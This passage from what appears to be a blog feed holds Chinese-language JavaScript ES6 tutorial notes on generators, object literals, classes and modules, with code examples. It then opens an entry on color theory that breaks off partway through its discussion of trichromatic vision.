<span class="variable language_">this</span>.<span class="property">value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">left</span>) &#123;</span><br><span class="line">            <span class="keyword">yield</span>* <span class="variable language_">this</span>.<span class="property">left</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">right</span>) &#123;</span><br><span class="line">            <span class="keyword">yield</span>* <span class="variable language_">this</span>.<span class="property">right</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> tree = <span class="keyword">new</span> <span class="title class_">BinaryTree</span>(<span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">BinaryTree</span>(<span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">BinaryTree</span>(<span class="string">&#x27;c&#x27;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">BinaryTree</span>(<span class="string">&#x27;d&#x27;</span>)),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">BinaryTree</span>(<span class="string">&#x27;e&#x27;</span>));</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> x <span class="keyword">of</span> tree) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x); <span class="comment">// a  b  c  d  e</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsfuncgenerator-5"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// No way to receive value of first next()</span></span><br><span class="line"><span class="keyword">function</span>* <span class="title function_">gen</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="keyword">const</span> input = <span class="keyword">yield</span> count;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(input); <span class="comment">// b  c (no way to receive &#x27;a&#x27;)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> obj = <span class="title function_">gen</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="title function_">next</span>(<span class="string">&#x27;a&#x27;</span>)); <span class="comment">// &#123; value: 1, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="title function_">next</span>(<span class="string">&#x27;b&#x27;</span>)); <span class="comment">// &#123; value: 2, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="title function_">next</span>(<span class="string">&#x27;c&#x27;</span>)); <span class="comment">// &#123; value: 3, done: false &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// fixes the issue</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">coroutine</span>(<span class="params">generatorFunction</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">...args</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> genObj = <span class="title function_">generatorFunction</span>(...args);</span><br><span class="line">        genObj.<span class="title function_">next</span>();</span><br><span class="line">        <span class="keyword">return</span> genObj;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> obj = <span class="title function_">coroutine</span>(gen)();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="title function_">next</span>(<span class="string">&#x27;a&#x27;</span>)); <span class="comment">// &#123; value: 2, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="title function_">next</span>(<span class="string">&#x27;b&#x27;</span>)); <span class="comment">// &#123; value: 3, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="title function_">next</span>(<span class="string">&#x27;c&#x27;</span>)); <span class="comment">// &#123; value: 4, done: false &#125;</span></span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="类（class）"><a href="#类（class）" class="headerlink" title="类（class）"></a>类（class）</h1><h2 id="OOP-Feature"><a href="#OOP-Feature" class="headerlink" title="OOP-Feature"></a>OOP-Feature</h2><ul>
<li>支持可计算的方法名，例如<code>[&#39;b&#39;+&#39;ar&#39;]: 3</code> （属性名为bar）</li>
<li>支持生成器方法，例如<code>* [Symbol.iterator]() &#123;...&#125;</code></li>
</ul>
<div class="tabs" id="jsoopfeature"><ul class="nav-tabs"><li class="tab active"><a href="#jsoopfeature-1">ObjectLiteral</a></li><li class="tab"><a href="#jsoopfeature-2">MethodOfObject</a></li></ul><div class="tab-content"><div class="tab-pane active" id="jsoopfeature-1"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> m = <span class="string">&#x27;M&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> n = <span class="string">&#x27;N&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> p = <span class="string">&#x27;P&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    m,</span><br><span class="line">    <span class="attr">n</span>: n,</span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">mn</span>() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">m</span> + <span class="variable language_">this</span>.<span class="property">n</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">set</span> <span class="title function_">mn</span>(<span class="params">value</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">m</span> = value[<span class="number">0</span>];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">n</span> = value[<span class="number">1</span>];</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">x</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">y</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">add</span>: <span class="keyword">function</span> (<span class="params">x, y</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> x + y;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">add_es6</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> x + y;</span><br><span class="line">    &#125;,</span><br><span class="line">    [p]: <span class="literal">true</span>,</span><br><span class="line">    [<span class="string">&#x27;b&#x27;</span>+<span class="string">&#x27;ar&#x27;</span>]: <span class="number">3</span>, <span class="comment">// ES6</span></span><br><span class="line">    [<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;i&#x27;</span>]() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Hello&#x27;</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    * [<span class="title class_">Symbol</span>.<span class="property">iterator</span>]() &#123; <span class="comment">// (generator function)</span></span><br><span class="line">        <span class="keyword">yield</span> <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        <span class="keyword">yield</span> <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj[<span class="string">&#x27;m&#x27;</span>], obj.<span class="property">n</span>, obj.<span class="property">mn</span>); <span class="comment">// M N MN</span></span><br><span class="line">obj.<span class="property">mn</span> = <span class="string">&#x27;mn&#x27;</span>; <span class="comment">// (setter)</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">m</span>, obj.<span class="property">n</span>, obj.<span class="property">mn</span>); <span class="comment">// m n mn</span></span><br><span class="line"><span class="keyword">const</span> &#123;x,y&#125; = obj; <span class="comment">// (destructuring)</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x, y); <span class="comment">// 1 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="title function_">add</span>(<span class="number">1</span>, <span class="number">2</span>), obj.<span class="title function_">add_es6</span>(<span class="number">1</span>, <span class="number">2</span>)); <span class="comment">// 3 3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">p</span>, obj.<span class="property">P</span>, obj[<span class="string">&#x27;P&#x27;</span>]); <span class="comment">// undefined true true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">bar</span>, obj[<span class="string">&#x27;bar&#x27;</span>], obj[<span class="string">&#x27;ba&#x27;</span>+<span class="string">&#x27;r&#x27;</span>]); <span class="comment">// 3 3 3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">hi</span>, obj.<span class="title function_">hi</span>()); <span class="comment">// [Function: hi] Hello</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> item <span class="keyword">of</span> obj) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(item); <span class="comment">// A B</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsoopfeature-2"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// assign()</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123; <span class="attr">foo</span>: <span class="number">123</span> &#125;;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(obj, &#123; <span class="attr">bar</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj)); <span class="comment">// &#123;&quot;foo&quot;:123,&quot;bar&quot;:true&#125;</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="Class"><a href="#Class" class="headerlink" title="Class"></a>Class</h2><ul>
<li>ES6的class本质还是function，只是提供了更方便的语法形式</li>
<li>类声明不会被提升（hoisted），在执行到它的定义时才会存在</li>
<li>两种定义类的方式：<code>class declarations</code>和<code>class expressions</code><ul>
<li>支持内部名称（lexical inner name），此名称只在类内部实现中可用</li>
</ul>
</li>
<li><code>extends</code>关键字用于创建subclass，且static属性也是被继承的，子类中必须通过<code>super()</code>调用父类构造函数</li>
<li>默认构造器：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">  <span class="comment">// base class</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">- 私有数据：</span><br><span class="line">  - 通过constructor存储到<span class="variable constant_">JS</span>引擎的内部数据结构中</span><br><span class="line">  - 通过命名约定（前缀<span class="string">`_`</span>），但语法上并未限制访问</span><br><span class="line"></span><br><span class="line">  <span class="comment">// derived class</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">...args</span>) &#123;</span><br><span class="line">      <span class="variable language_">super</span>(...args);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure></li>
</ul>
<div class="tabs" id="jsclass"><ul class="nav-tabs"><li class="tab active"><a href="#jsclass-1">ClassDeclaration</a></li><li class="tab"><a href="#jsclass-2">ClassExpression</a></li><li class="tab"><a href="#jsclass-3">PrivateData</a></li><li class="tab"><a href="#jsclass-4">PrivateData</a></li></ul><div class="tab-content"><div class="tab-pane active" id="jsclass-1"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">    <span class="comment">// pseudo-method constructor</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">x</span> = x;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">y</span> = y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// static method</span></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">getClassName</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Point&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// getter and setter</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">get</span> <span class="title function_">ONE</span>() &#123; <span class="comment">// add a static property</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Point</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">xy</span>() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.x&#125;</span><span class="subst">$&#123;<span class="variable language_">this</span>.y&#125;</span>`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">set</span> <span class="title function_">xy</span>(<span class="params">v</span>) &#123;</span><br><span class="line">        v = <span class="title class_">String</span>(v)</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">x</span> = v[<span class="number">0</span>]</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">y</span> = v[<span class="number">1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// prototype method</span></span><br><span class="line">    <span class="title function_">toString</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`(<span class="subst">$&#123;<span class="variable language_">this</span>.x&#125;</span>, <span class="subst">$&#123;<span class="variable language_">this</span>.y&#125;</span>)`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Point</span>.<span class="property">ZERO</span> = <span class="keyword">new</span> <span class="title class_">Point</span>(<span class="number">0</span>, <span class="number">0</span>); <span class="comment">// add a static property</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Point</span> === <span class="title class_">Point</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Point</span>.<span class="property">ZERO</span>.<span class="property">x</span>, <span class="title class_">Point</span>.<span class="property">ZERO</span>.<span class="property">y</span>); <span class="comment">// 0 0</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Point</span>.<span class="property">ONE</span>.<span class="property">x</span>, <span class="title class_">Point</span>.<span class="property">ONE</span>.<span class="property">y</span>); <span class="comment">// 1 1</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Point</span>(<span class="number">3</span>, <span class="number">6</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p.<span class="property">xy</span>); <span class="comment">// 36</span></span><br><span class="line">p.<span class="property">xy</span> = <span class="number">48</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p.<span class="property">xy</span>); <span class="comment">// 48</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ColorPoint</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Point</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">x, y, color</span>) &#123;</span><br><span class="line">        <span class="variable language_">super</span>(x, y);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">color</span> = color;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">toString</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">super</span>.<span class="title function_">toString</span>() + <span class="string">&#x27; in &#x27;</span> + <span class="variable language_">this</span>.<span class="property">color</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> <span class="title class_">Point</span>, <span class="keyword">typeof</span> <span class="title class_">ColorPoint</span>); <span class="comment">// function function</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(<span class="title class_">ColorPoint</span>) === <span class="title class_">Point</span>); <span class="comment">// true (子类的prototype是父类)</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">ColorPoint</span>.<span class="title function_">getClassName</span>()); <span class="comment">// &#x27;Point&#x27;（static properties are inherited）</span></span><br><span class="line"><span class="keyword">const</span> cp = <span class="keyword">new</span> <span class="title class_">ColorPoint</span>(<span class="number">25</span>, <span class="number">8</span>, <span class="string">&#x27;green&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cp.<span class="title function_">toString</span>());             <span class="comment">// &#x27;(25, 8) in green&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cp <span class="keyword">instanceof</span> <span class="title class_">ColorPoint</span>);  <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cp <span class="keyword">instanceof</span> <span class="title class_">Point</span>);       <span class="comment">// true</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsclass-2"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Color</span> = <span class="keyword">class</span> <span class="title class_">CC</span> &#123;</span><br><span class="line">    <span class="title function_">getClassName</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable constant_">CC</span>.<span class="property">name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> inst = <span class="keyword">new</span> <span class="title class_">Color</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(inst.<span class="title function_">getClassName</span>()); <span class="comment">// CC</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable constant_">CC</span>.<span class="property">name</span>); <span class="comment">// ReferenceError: CC is not defined</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsclass-3"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// via constructor environment</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Countdown</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">counter, action</span>) &#123;</span><br><span class="line">        <span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="variable language_">this</span>, &#123;</span><br><span class="line">            <span class="title function_">dec</span>(<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (counter &lt; <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">                counter--;</span><br><span class="line">                <span class="keyword">if</span> (counter === <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="title function_">action</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// via a naming convention</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Countdown</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">counter, action</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_counter</span> = counter;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_action</span> = action;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">dec</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">_counter</span> &lt; <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_counter</span>--;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">_counter</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_action</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> c = <span class="keyword">new</span> <span class="title class_">Countdown</span>(<span class="number">2</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;DONE&#x27;</span>));</span><br><span class="line">c.<span class="title function_">dec</span>();</span><br><span class="line">c.<span class="title function_">dec</span>(); <span class="comment">// DONE</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsclass-4"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="模块（module）"><a href="#模块（module）" class="headerlink" title="模块（module）"></a>模块（module）</h1><ul>
<li>CommonJS模块：2009年由Kevin Dangoor (Mozilla)发起，通常只用在NodeJS中，默认扩展名<code>.js</code><ul>
<li>导入：<code>require()</code>，synchronous</li>
<li>导出：<code>module.exports</code></li>
</ul>
</li>
<li>ES6模块：2015年引入，可用在Browser和NodeJS（v13.2.0稳定）中，默认扩展名<code>.mjs</code><ul>
<li>导入：<code>import</code>，asynchronous</li>
<li>导出：<code>export</code></li>
<li>在package.json中增加<code>&quot;type: module&quot;</code>可以启用ES6模块</li>
<li>在browser中通过<code>import()</code>函数返回<code>Promise</code>对象的方式实现动态导入</li>
</ul>
</li>
</ul>
<div class="tabs" id="js-module"><ul class="nav-tabs"><li class="tab active"><a href="#js-module-1">CommonJS</a></li><li class="tab"><a href="#js-module-2">ES6Module</a></li><li class="tab"><a href="#js-module-3">Browser</a></li></ul><div class="tab-content"><div class="tab-pane active" id="js-module-1"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// util.js</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span>.<span class="property">add</span> = <span class="keyword">function</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">const</span> &#123;add&#125; = <span class="built_in">require</span>(<span class="string">&#x27;./util&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="number">5</span>, <span class="number">5</span>)) <span class="comment">// 10</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="js-module-2"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// util.mjs</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.mjs</span></span><br><span class="line"><span class="keyword">import</span> &#123;add&#125; <span class="keyword">from</span> <span class="string">&#x27;./util.mjs&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="number">5</span>, <span class="number">5</span>)) <span class="comment">// 10</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="js-module-3"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hello.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> hello = <span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// index.html</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">import</span> &#123; hello &#125; <span class="keyword">from</span> <span class="string">&quot;./hello.js&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#app&quot;</span>).<span class="property">innerHTML</span> = hello;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// index.html (dynamic Import by import())</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">(<span class="keyword">async</span> () =&gt; &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> helloModule = <span class="keyword">await</span> <span class="keyword">import</span>(<span class="string">&quot;./hello.js&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#app&quot;</span>).<span class="property">innerHTML</span> = helloModule.<span class="property">hello</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;)();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Introduction">Mozilla JavaScript Guide</a><br>[2] <a href="https://262.ecma-international.org/6.0/">ECMAScript 2015 Language Specification</a><br>[3] <a href="https://exploringjs.com/es6/">Exploring ES6</a></p>
]]></content>
      <categories>
        <category>ProgrammingLanguage</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>色彩理论</title>
    <url>/Media/ColorTheory.html</url>
    <content><![CDATA[<p>客观上说，颜色只是反射到眼睛中的光线，其光谱能量分布在感官中的一种表现，因此任何颜色的感知都是主观的。然而，光谱能量分布与人类感官反应之间是可以被量化的，由此建立的模型可以统一对色彩的认识。</p>
<span id="more"></span>

<h1 id="光谱颜色"><a href="#光谱颜色" class="headerlink" title="光谱颜色"></a>光谱颜色</h1><ul>
<li>流明（luminance）：沿给定方向传播的光在单位面积上的光强（通过的光量）。单位：$cd&#x2F;m^2$<img data-src="/images/Media/visible_spectrum.png" class="" width="800" height="200" title="visible spectrum"></li>
<li>色温（color temperature）：一个理想的黑体辐射体发出与目标光源相似的光时，此黑体辐射体所达到的温度（绝对黑体从绝对零度开始加温，逐渐由黑变红，转黄，发白，最后发出蓝色光）。单位：K<img data-src="/images/Media/color_temperature_black_body_800-12200K.svg" class="" width="800" height="200" title="color temperature of black body">
<ul>
<li>冷色（cool color）：黑体辐射温度高的时候的颜色</li>
<li>暖色（warm color）：黑体辐射温度低的时候的颜色</li>
</ul>
</li>
<li>中性色（neutral color）：黑色（black）、白色（white）和所有灰色（gray）<ul>
<li>一个常见的参考白色（reference white）是由CIE&#x2F;D65定义的黑体辐射在约6500K时的颜色</li>
</ul>
</li>
</ul>
<h1 id="色彩感知"><a href="#色彩感知" class="headerlink" title="色彩感知"></a>色彩感知</h1><ul>
<li>色相（hue）：颜色族的名字。 红、绿、蓝等<ul>
<li>色相变换（hue shift）：单色光的色相随着流明量而变化</li>
<li>阿布尼效应（abney effect）：单色光的色相随着白光的加入而改变，而白光本身是无色的（color-neutral）</li>
</ul>
</li>
<li>明度（lightness）：对物体通光量（luminance）的视觉感知</li>
<li>亮度（brightness）：对物体辐射或反射的光的视觉感知<ul>
<li>Helmholtz–Kohlrausch effect：亮度会随着饱和度的增加而增加</li>
</ul>
</li>
<li>色度（chroma）：与颜色强弱相关，将物体颜色与同样亮度的灰色对比，差异的视觉感知</li>
<li>饱和度（saturation）：与颜色强弱（intensity）有关的视觉感知</li>
<li>对比度（contrast）：物体在图片或显示器中表现出通光量（luminance）或颜色（colour）上的差异<ul>
<li>史蒂文斯效应（stevens effect）：随着通光量的增加而增加</li>
<li>Bartleson–Breneman effect：显示器中的图像随着周围照明的通光量（luminance）的增加而增加</li>
</ul>
</li>
</ul>
<h1 id="色彩模型"><a href="#色彩模型" class="headerlink" title="色彩模型"></a>色彩模型</h1><p>色彩模型（color model）是将色彩表示为3&#x2F;4个数字元组的数学模型。这些精确描述的组件结合到视觉感知时，得到的特定颜色集合称为“色彩空间（color space）”。</p>
<h2 id="三原色理论"><a href="#三原色理论" class="headerlink" title="三原色理论"></a>三原色理论</h2><p><a href="https://graphics.stanford.edu/courses/cs178/applets/locus.html">Introduction to color theory</a><br><a href="https://medium.com/hipster-color-science/a-beginners-guide-to-colorimetry-401f1830b65a">A Beginner’s Guide to (CIE) Colorimetry</a><br><a href="https://www.cs.rochester.edu/courses/572/colorvis/">Interactive Tutorials on Color Science Basics</a><br><a href="https://www.cs.rochester.edu/courses/572/fall2020/decks/colorimetry.pdf">rochester colorimetry</a><br><a href="http://www.cvrl.org/lumindex.htm">Colour &amp; Vision Research Laboratory of the University College London, page on luminous efficiency functions.</a><br><a href="https://zhuanlan.zhihu.com/p/84891237">颜色知识1-人类的视觉系统与颜色</a><br><a href="https://zhuanlan.zhihu.com/p/84897327">颜色知识2-三原色理论与颜色匹配实验</a></p>
<p>色觉的三色理论（trichromatic theory of color vision）在1801年被Thomas Young提出，1860年被Hermann von Helmholtz和 James Clerk Maxwell 进行扩展，于1983年被实验所验证，此理论要点有：</p>
<ul>
